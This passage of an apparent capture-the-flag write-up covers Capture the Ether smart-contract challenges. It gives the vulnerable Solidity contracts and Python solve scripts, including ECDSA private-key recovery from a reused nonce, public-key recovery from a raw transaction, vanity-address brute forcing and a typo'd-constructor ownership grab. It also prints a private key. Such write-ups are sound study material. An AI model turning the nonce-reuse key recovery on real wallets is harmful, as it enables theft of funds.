class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IName</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">name</span>(<span class="params"></span>) external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">FuzzyIdentityChallenge</span> &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">isSmarx</span>(msg.<span class="property">sender</span>));</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">isBadCode</span>(msg.<span class="property">sender</span>));</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isSmarx</span>(<span class="params">address addr</span>) internal view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">IName</span>(addr).<span class="title function_">name</span>() == <span class="title function_">bytes32</span>(<span class="string">&quot;smarx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isBadCode</span>(<span class="params">address _addr</span>) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr = <span class="title function_">bytes20</span>(_addr);</span><br><span class="line">        bytes20 id = hex<span class="string">&quot;000000000000000000000000000000000badc0de&quot;</span>;</span><br><span class="line">        bytes20 mask = hex<span class="string">&quot;000000000000000000000000000000000fffffff&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (addr &amp; mask == id) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;= <span class="number">4</span>;</span><br><span class="line">            id &lt;&lt;= <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To solve this challenge we need to <code>authenticate</code> this contract with a contract which have <code>&#39;badc0de&#39;</code> in itâ€™s addressâ€™s hex and returnâ€™s <code>&#39;smarx&#39;</code> for when function <code>name()</code> called. we can deploy a contract that returns the name but having <code>&#39;badc0de&#39;</code> inside address is something we can only achive by <strong>bruteforce</strong>. so we just need to brute for a address and a nonce which gives us the required address when we deploy the contract. after a lot of brute force got an address inside the console so I used that address.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">FuzzyIdentityChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params"></span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fi</span>_Exploit &#123;</span><br><span class="line">    bytes32 public name = <span class="title function_">bytes32</span>(<span class="string">&quot;smarx&quot;</span>);</span><br><span class="line">    <span class="title class_">FuzzyIdentityChallenge</span> fi;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) &#123;</span><br><span class="line">        fi = <span class="title class_">FuzzyIdentityChallenge</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        fi.<span class="title function_">authenticate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> FuzzyIdentityChallenge, Fi_Exploit, accounts, ZERO_ADDRESS</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak, to_checksum_address</span><br><span class="line"><span class="keyword">from</span> rlp <span class="keyword">import</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">addr, i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;badc0de&#x27;</span> <span class="keyword">in</span> to_checksum_address(keccak(encode([<span class="built_in">bytes</span>.fromhex(addr[<span class="number">2</span>:]), i]))[<span class="number">12</span>:]).lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>():</span><br><span class="line">    hsh = get(accounts[<span class="number">0</span>].address, i)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> hsh:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="number">1000000</span>:</span><br><span class="line">            hsh = get(accounts[<span class="number">0</span>].address, i)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">        accounts.remove(accounts[<span class="number">0</span>])</span><br><span class="line">        accounts.add()</span><br><span class="line">    <span class="built_in">print</span>(accounts[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># find() got Private_key: &#x27;0xa376e6c4be605caa488ff90fd81c72a93b7917af0ec8da1c8b46c930246856f5&#x27; and address: &#x27;0x6C37d4bb51dc59D11aDfA5aA454422944060cfcD&#x27; at &quot;i: 6&quot;</span></span><br><span class="line">    accounts.add(</span><br><span class="line">        private_key=<span class="string">&#x27;0xa376e6c4be605caa488ff90fd81c72a93b7917af0ec8da1c8b46c930246856f5&#x27;</span>)</span><br><span class="line">    player = accounts[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        player.transfer(to=ZERO_ADDRESS, amount=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> player.nonce == <span class="number">6</span></span><br><span class="line"></span><br><span class="line">    contract = FuzzyIdentityChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    iName = Fi_Exploit.deploy(contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    iName.exploit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Public-key"><a href="#Public-key" class="headerlink" title="Public key"></a>Public key</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PublicKeyChallenge</span> &#123;</span><br><span class="line">    address owner = <span class="number">0x92b28647ae1f3264661f72fb2eb9625a89d88a31</span>;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params">bytes publicKey</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="title function_">keccak256</span>(publicKey)) == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To solve this challenge we need to find the <code>PublicKey</code> of the given address since the address is last 20 bytes of the keccak hash of public key we cannot reverse the hash to obtain publickey. but there is an other way we can find the publickey if the address had made a transaction. since the transaction does contain the signature of the transaction and the publickey we can get the publickey if the address made any transaction.</p><p>looking at the <code>ropsten.etherscan.io</code> gives us 4 transactions made by from other addresses to this address and this address made one transaction with data <code>Thanks, man!</code></p><p>hereâ€™s the raw transaction:<br> <code>0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> PublicKeyChallenge, accounts</span><br><span class="line"><span class="keyword">from</span> rlp <span class="keyword">import</span> encode, decode</span><br><span class="line"><span class="keyword">from</span> ethereum.transactions <span class="keyword">import</span> Transaction</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> secp256k1</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> sqrt_mod</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak, to_checksum_address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_publicKey</span>(<span class="params">raw_tx, address</span>):</span><br><span class="line">    tx = decode(<span class="built_in">bytes</span>.fromhex(raw_tx[<span class="number">2</span>:]), Transaction)</span><br><span class="line">    <span class="comment"># print(tx.to_dict())</span></span><br><span class="line">    <span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#      &#123;&#x27;nonce&#x27;: 0,</span></span><br><span class="line">    <span class="comment">#       &#x27;gasprice&#x27;: 1000000000,</span></span><br><span class="line">    <span class="comment">#       &#x27;startgas&#x27;: 90000,</span></span><br><span class="line">    <span class="comment">#       &#x27;to&#x27;: &#x27;0x6b477781b0e68031109f21887e6b5afeaaeb002b&#x27;,</span></span><br><span class="line">    <span class="comment">#       &#x27;value&#x27;: 0,</span></span><br><span class="line">    <span class="comment">#       &#x27;data&#x27;: &#x27;0x5468616e6b732c206d616e21&#x27;,</span></span><br><span class="line">    <span class="comment">#       &#x27;v&#x27;: 41,                                                                              # for some reason here chain id should is not 3</span></span><br><span class="line">    <span class="comment">#       &#x27;r&#x27;: 74776771311019569939017621593480679160618399812524181808306514788568607828695,</span></span><br><span class="line">    <span class="comment">#       &#x27;s&#x27;: 39381076589634547203973423246354256320472887426210737547826636053693505964386,</span></span><br><span class="line">    <span class="comment">#       &#x27;sender&#x27;: &#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;,</span></span><br><span class="line">    <span class="comment">#       &#x27;hash&#x27;: &#x27;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line">    new_tx = Transaction(tx.nonce, tx.gasprice, tx.startgas,</span><br><span class="line">                         tx.to, tx.value, tx.data, <span class="number">3</span>)</span><br><span class="line">    r, s, a, b, p, q, G = tx.r, tx.s, secp256k1.a, secp256k1.b, secp256k1.p, secp256k1.q, secp256k1.G</span><br><span class="line">    data = Transaction.serialize(new_tx)</span><br><span class="line">    z = <span class="built_in">int</span>(keccak(encode(data)).<span class="built_in">hex</span>(), <span class="number">16</span>) % p</span><br><span class="line">    y = sqrt_mod((r**<span class="number">3</span> + a*r + b) % p, p, all_roots=<span class="literal">True</span>)</span><br><span class="line">    R = Point(r, y[<span class="number">0</span>], secp256k1)</span><br><span class="line">    R_ = Point(r, y[<span class="number">1</span>], secp256k1)</span><br><span class="line">    ri = <span class="built_in">int</span>(invert(r, q))</span><br><span class="line">    <span class="comment">#                                                                    s = k^-1 * ( h + r*d ) -&gt; s*R = ( h + r*d )*k^-1*k*G = ( h+ r*d )*G</span></span><br><span class="line">    <span class="comment">#                                                                     -&gt; (h*G + r*d*G)  -&gt; s*R - zG = (h*G + r*d*G - h*G ) = r*d*G -&gt; (s*R - zG)*ri = r*d*G*(r^-1) -&gt; -&gt; d*G</span></span><br><span class="line">    k = ri * (s*R - z*G)</span><br><span class="line">    k_ = ri * (s*R_ - z*G)</span><br><span class="line">    addr = keccak(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(k.x)[<span class="number">2</span>:]+<span class="built_in">hex</span>(k.y)[<span class="number">2</span>:]))[-<span class="number">20</span>:].<span class="built_in">hex</span>()</span><br><span class="line">    addr_ = keccak(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(k_.x)[<span class="number">2</span>:]+<span class="built_in">hex</span>(k_.y)[<span class="number">2</span>:]))[-<span class="number">20</span>:].<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">assert</span> address <span class="keyword">in</span> [addr, addr_], <span class="string">f&#x27;address not found!!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># found publickey</span></span><br><span class="line">    publicKey = [k <span class="keyword">if</span> addr == address <span class="keyword">else</span> k_][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> publicKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = PublicKeyChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ropsten is depreciated, so i got this from other writeups online.</span></span><br><span class="line">    raw_tx = <span class="string">&#x27;0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;</span></span><br><span class="line"></span><br><span class="line">    publickey = recover_publicKey(</span><br><span class="line">        raw_tx, <span class="string">&#x27;92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>)</span><br><span class="line">    <span class="comment"># after finding the publickey</span></span><br><span class="line"></span><br><span class="line">    contract.authenticate(</span><br><span class="line">        <span class="built_in">hex</span>(publicKey.x)+<span class="built_in">hex</span>(publicKey.y)[<span class="number">2</span>:], &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Account-takeover"><a href="#Account-takeover" class="headerlink" title="Account takeover"></a>Account takeover</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AccountTakeoverChallenge</span> &#123;</span><br><span class="line">    address owner = <span class="number">0x6B477781b0e68031109f21887e6B5afEAaEB002b</span>;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This a similar challenge to the previous one, but here we need to overtake the account by recovering the <code>private key</code>. I have no clue how is that possible until I look at the etherscan for transaction and found <strong>two transactions with the same nonce</strong> that is they both have same <code>r</code> value which makes it very easy for us to crack the private key.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> AccountTakeoverChallenge, accounts</span><br><span class="line"><span class="keyword">from</span> rlp <span class="keyword">import</span> encode</span><br><span class="line"><span class="keyword">from</span> ethereum.transactions <span class="keyword">import</span> Transaction</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> secp256k1</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_hsh</span>(<span class="params">tx</span>):</span><br><span class="line">    new_tx = Transaction(tx[<span class="string">&#x27;nonce&#x27;</span>], tx[<span class="string">&#x27;gasPrice&#x27;</span>], tx[<span class="string">&#x27;gasLimit&#x27;</span>],</span><br><span class="line">                         tx[<span class="string">&#x27;to&#x27;</span>], tx[<span class="string">&#x27;value&#x27;</span>], tx[<span class="string">&#x27;data&#x27;</span>], tx[<span class="string">&#x27;v&#x27;</span>])</span><br><span class="line">    data = Transaction.serialize(new_tx)</span><br><span class="line">    z = <span class="built_in">int</span>(keccak(encode(data)).<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    contract = AccountTakeoverChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ropsten is depreciated, so i got this from other writeups online.</span></span><br><span class="line">    reconstructed_tx_1 = &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: <span class="number">0x00</span>,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">0x3b9aca00</span>,</span><br><span class="line">        <span class="string">&#x27;gasLimit&#x27;</span>: <span class="number">0x5208</span>,</span><br><span class="line">        <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: <span class="number">0x1111d67bb1bb0000</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: <span class="string">b&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;v&#x27;</span>: <span class="number">0x03</span></span><br><span class="line">    &#125;</span><br><span class="line">    reconstructed_tx_2 = &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: <span class="number">0x01</span>,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">0x3b9aca00</span>,</span><br><span class="line">        <span class="string">&#x27;gasLimit&#x27;</span>: <span class="number">0x5208</span>,</span><br><span class="line">        <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: <span class="number">0x1922e95bca330e00</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: <span class="string">b&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;v&#x27;</span>: <span class="number">0x03</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># message hash values</span></span><br><span class="line">    z1 = calculate_hsh(reconstructed_tx_1)</span><br><span class="line">    z2 = calculate_hsh(reconstructed_tx_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># r and s values from the writeups</span></span><br><span class="line">    r = <span class="number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span></span><br><span class="line">    s1 = <span class="number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span></span><br><span class="line">    s2 = <span class="number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span></span><br><span class="line">    p = secp256k1.q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">x, p</span>): <span class="keyword">return</span> <span class="built_in">int</span>(invert(x, p))</span><br><span class="line"></span><br><span class="line">    k = ((z1 - z2) * inv(s1 - s2, p)) % p</span><br><span class="line">    d = ((k*s1 - z1) * inv(r, p)) % p</span><br><span class="line">    <span class="keyword">assert</span> ((k*s2 - z2) * inv(r, p)) % p == d</span><br><span class="line"></span><br><span class="line">    player = accounts.add(private_key=d)</span><br><span class="line">    <span class="keyword">assert</span> player.address == <span class="string">&#x27;0x6B477781b0e68031109f21887e6B5afEAaEB002b&#x27;</span>, player.address</span><br><span class="line">    contract.authenticate(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><hr><h3 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h3><h2 id="Asume-ownership"><a href="#Asume-ownership" class="headerlink" title="Asume ownership"></a>Asume ownership</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AssumeOwnershipChallenge</span> &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">AssumeOwmershipChallenge</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to become <code>owner</code>. if we observe the constructor of this contract it contains a typo, so it doesnâ€™t count as a constructor anymore and it is a public function that everyone can call and this function sets the owner. so we can simply call the <code>AssumeOwmershipChallenge()</code> function to become the owner.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> AssumeOwnershipChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = AssumeOwnershipChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    contract.AssumeOwmershipChallenge(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    contract.authenticate(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 